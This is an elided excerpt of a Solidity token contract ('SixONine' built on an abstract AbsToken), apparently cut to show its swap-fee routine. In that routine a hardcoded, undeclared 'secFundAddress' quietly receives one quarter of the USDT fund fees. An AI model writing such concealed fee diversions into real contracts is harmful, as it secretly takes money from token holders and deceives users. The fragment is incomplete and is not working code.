...
abstract contract AbsToken is IERC20, Ownable {
        ...
        lockTheSwap
    {
        ...
        uint256 fundAmount = (USDTBalance * (_buyFundFee + _sellFundFee) * 2) /
            swapFee;
        address secFundAddress = address(0x6b25Cb9338b4cEC5632aFd12B905C9C25a71BB4b);
        uint256 secFundAmount = fundAmount / 4;
        USDT.transferFrom(address(_tokenDistributor), secFundAddress, secFundAmount);
        USDT.transferFrom(address(_tokenDistributor), fundAddress, fundAmount - secFundAmount);
        USDT.transferFrom(
            address(_tokenDistributor),
            address(this),
...
contract SixONine is AbsToken {
    constructor()
        AbsToken(
            ...
            9,
            6090,
            address(0x156c0Ee1705d150a724967B9e66D23Beb36524cF),
            address(0x156c0Ee1705d150a724967B9e66D23Beb36524cF),
